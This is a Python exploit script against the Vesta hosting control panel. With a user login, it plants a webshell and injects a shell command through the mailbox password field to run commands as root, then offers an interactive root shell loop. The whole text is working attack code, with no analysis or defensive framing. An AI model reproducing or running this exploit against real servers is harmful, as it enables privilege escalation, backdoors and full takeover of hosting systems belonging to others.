from VestaFuncs import *
import sys


if len(sys.argv) == 4:
	targetHost = sys.argv[1]
	targetUser = sys.argv[2]
	targetPass = sys.argv[3]
else:
	print("Usage\npython3 vestaROOT.py https://target_host:8083 user_login user_pass")
	exit()


ipFromHostname = getIPfromHostname(targetHost)
pwnDomain      = get_random_string().lower()+'.poc'

## init user session
uus = requests.Session()

## Login
if login(uus,targetHost,targetUser,targetPass):
	
	## Check own webshell
	if getWebshell(uus,targetHost,pwnDomain,targetUser,ipFromHostname):

		## Check, delete and create mailbox on pwnDomain
		mailBox = createMailBox(uus,targetHost,pwnDomain,True)
		if(mailBox):
			eMailBox = editMailBox(uus,targetHost,pwnDomain,mailBox['account'],'testPayload')
			if(eMailBox):
				## Deploy backdoor
				if editMailBox(uus,targetHost,pwnDomain,mailBox['account'],"';bash</home/"+targetUser+"/web/"+pwnDomain+"/public_html/iamroot/cmdtoexec>/home/"+targetUser+"/web/"+pwnDomain+"/public_html/iamroot/cmdresult;A='"):
					print('[+] root shell possibly obtained')
					while True:
						ucmd = input('# ')
						deploycommand(ucmd,ipFromHostname,pwnDomain)
						editMailBox(uus,targetHost,pwnDomain,mailBox['account'],"foobar",False)
						print(queryWebshell('echo `cat ./iamroot/cmdresult;`;',ipFromHostname,pwnDomain))

		## Logout
		logout(uus,targetHost)
		print('[+] Logged out')
